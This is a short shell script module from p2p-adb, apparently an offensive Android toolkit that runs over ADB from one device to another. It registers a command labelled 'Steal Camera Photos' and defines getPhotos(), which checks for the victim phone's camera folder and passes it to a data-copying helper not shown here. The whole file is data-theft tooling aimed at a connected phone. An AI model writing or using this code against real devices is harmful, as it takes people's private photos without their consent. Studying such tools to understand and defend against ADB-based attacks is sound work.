# p2p-adb
# https://github.com/kosborn/p2p-adb/
# @theKos
# kyle@kyleosborn.com


# Registering command 
registerCommand "3:getPhotos:Steal Camera Photos"


getPhotos(){
	DIREXISTS=$(adb shell '[[ -d /sdcard/DCIM/Camera/  ]] && echo 1' | tr -d "\r")

	if [ "$DIREXISTS" = "1" ]; then
		DATAPATH='/sdcard/DCIM/Camera'
		getData "$DATAPATH"
	else
		echo "Camera directory doesn't exist?"
	fi
}
